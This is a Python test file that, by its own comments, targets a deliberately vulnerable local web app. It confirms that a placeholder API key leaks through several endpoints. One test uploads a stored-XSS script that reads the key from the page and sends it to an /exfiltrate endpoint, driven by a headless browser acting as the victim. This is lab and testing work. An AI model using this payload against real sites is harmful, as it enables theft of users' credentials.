import os
import time
import json
import requests
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

BASE_URL = 'http://127.0.0.1:5000'

# Helper to ensure server is up

def wait_for_server(timeout=5):
    for _ in range(timeout * 5):
        try:
            requests.get(BASE_URL)
            return True
        except Exception:
            time.sleep(0.2)
    raise RuntimeError('Server not running')


def test_secret_exposed_in_dashboard():
    wait_for_server()
    r = requests.get(BASE_URL + '/login')
    assert r.status_code == 200
    # do login
    s = requests.Session()
    s.post(BASE_URL + '/login', data={'username': 'user1'})
    r = s.get(BASE_URL + '/dashboard')
    assert 'SENSITIVE_API_KEY_vuln_ABC123' in r.text


def test_secret_embedded_in_js():
    wait_for_server()
    r = requests.get(BASE_URL + '/static/js/client.js')
    assert 'SENSITIVE_API_KEY_vuln_ABC123' in r.text
    assert 'console.log(' in r.text


def write_json_report(report_path, report):
    with open(report_path, 'w', encoding='utf-8') as fh:
        json.dump(report, fh, indent=2)


def test_unsafe_preview_allows_injected_payload_execution():
    wait_for_server()
    # Start a Selenium headless browser to act as victim
    options = webdriver.ChromeOptions()
    options.add_argument('--headless=new')
    options.add_argument('--no-sandbox')
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    report = {
        'vulnerability': 'Unsafe HTML preview executes uploaded scripts, leading to API key exfiltration',
        'exploit_steps': [],
        'expected': 'No secrets are exfiltrated',
        'actual': '',
        'exploit_success': False
    }
    try:
        driver.get(BASE_URL + '/login')
        report['exploit_steps'].append('Login as victim')
        driver.find_element(By.NAME, 'username').send_keys('victim')
        driver.find_element(By.CSS_SELECTOR, 'button[type=submit]').click()
        time.sleep(0.8)
        assert 'Vulnerable Dashboard' in driver.page_source
        report['exploit_steps'].append('Open vulnerable dashboard')
        # Create a malicious HTML payload that steals API key from the dashboard
        malicious = "<script>new Image().src=\'/exfiltrate?token=\' + encodeURIComponent(document.getElementById('api-key').innerText);</script>"
        report['exploit_steps'].append('Upload malicious HTML file containing script to exfiltrate API')
        files = {'file': ('malicious.html', malicious)}
        s = requests.Session()
        s.post(BASE_URL + '/login', data={'username': 'u'})
        # Reset any previous exfiltrations
        s.post(BASE_URL + '/reset-exfiltrations')
        r = s.post(BASE_URL + '/upload', files=files)
        assert r.status_code == 200
        filename = r.json()['filename']
        # Open the preview page which will execute JS and cause the app to receive the token
        driver.get(BASE_URL + '/preview/' + filename)
        # Wait for the JS to execute and the exfiltrate endpoint to be invoked
        time.sleep(1.5)
        r = requests.get(BASE_URL + '/exfiltrations')
        data = r.json()
        # The exfiltrated token should contain the visible API key text
        found = any('SENSITIVE_API_KEY_vuln_ABC123' in e.get('token', '') for e in data)
        report['actual'] = {'exfiltrated': data}
        report['exploit_success'] = found
        write_json_report('vulnerable/exploit_result.json', report)
        assert found
    finally:
        driver.quit()


def test_client_side_logging_leaks_sensitive_info():
    wait_for_server()
    r = requests.get(BASE_URL + '/static/js/client.js')
    assert 'console.log' in r.text and 'SENSITIVE_API_KEY_vuln_ABC123' in r.text


def test_debug_info_exposes_internal_state():
    wait_for_server()
    s = requests.Session()
    s.post(BASE_URL + '/login', data={'username': 'u'})
    r = s.get(BASE_URL + '/debug-info')
    assert r.status_code == 200
    data = r.json()
    assert data.get('secret') == 'SENSITIVE_API_KEY_vuln_ABC123'


if __name__ == '__main__':
    print('Tests for vulnerable app designed to run against local server')
